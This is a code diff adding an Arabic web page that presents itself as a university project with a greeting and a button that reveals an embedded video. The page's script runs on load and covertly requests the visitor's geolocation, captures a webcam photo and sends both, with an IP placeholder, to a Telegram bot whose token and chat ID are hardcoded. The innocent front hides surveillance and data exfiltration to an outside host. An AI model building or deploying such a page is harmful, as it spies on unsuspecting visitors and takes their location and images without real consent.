@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشروع الجامعة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border: none;
+            border-radius: 12px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .video-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .video-container iframe {
+            display: block;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>صقر يسلم عليك</h1>
+        <p>طيب</p>
+        <button onclick="playVideo()">طيب</button>
+    </div>
+
+    <div class="video-container" id="videoContainer" style="display: none;">
+        <iframe width="560" height="315"
+                src="https://www.youtube.com/embed/BGkL2Pq-g3A"
+                frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+        </iframe>
+    </div>
+
+    <script>
+        function playVideo() {
+            document.getElementById('videoContainer').style.display = 'block';
+        }
+
+        // Function to collect IP address and other data
+        function collectData() {
+            // This is a placeholder function. In a real implementation, you would use an API to get the IP address.
+            const ipAddress = '192.168.1.1'; // Example IP address
+            const userInfo = { ipAddress: ipAddress };
+            const ipInfo = 'معلومات المستخدم: ' + JSON.stringify(userInfo);
+            sendToTelegram(ipInfo);
+        }
+
+        // Function to request geolocation permission
+        function requestGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                sendToTelegram('Geolocation is not supported by this browser.');
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const locationMessage = 'موقع المستخدم: إحداثيات (خط العرض: ' + latitude + ', خط الطول: ' + longitude + ')';
+            sendToTelegram(locationMessage);
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    sendToTelegram('تم رفض إذن الموقع من قبل المستخدم.');
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    sendToTelegram('معلومات الموقع غير متاحة.');
+                    break;
+                case error.TIMEOUT:
+                    sendToTelegram('انتهت مهلة الطلب للحصول على موقع المستخدم.');
+                    break;
+                case error.UNKNOWN_ERROR:
+                    sendToTelegram('حدث خطأ غير معروف.');
+                    break;
+            }
+        }
+
+        // Function to request camera permission and capture an image
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const videoElement = document.createElement('video');
+                    videoElement.srcObject = stream;
+                    videoElement.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+                        const imageData = canvas.toDataURL('image/png');
+                        sendToTelegram('تم التقاط صورة من الكاميرا:', imageData);
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                })
+                .catch(err => {
+                    sendToTelegram('تم رفض إذن الكاميرا من قبل المستخدم.');
+                });
+        }
+
+        // Function to send messages to Telegram
+        function sendToTelegram(message, imageData = null) {
+            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            if (imageData) {
+                const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+                fetch(photoUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData,
+                        caption: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            } else {
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+        }
+
+        // Collect data and request permissions on page load
+        window.onload = function() {
+            collectData();
+            requestGeolocation();
+            requestCameraPermission();
+        };
+    </script>
+</body>
+</html>
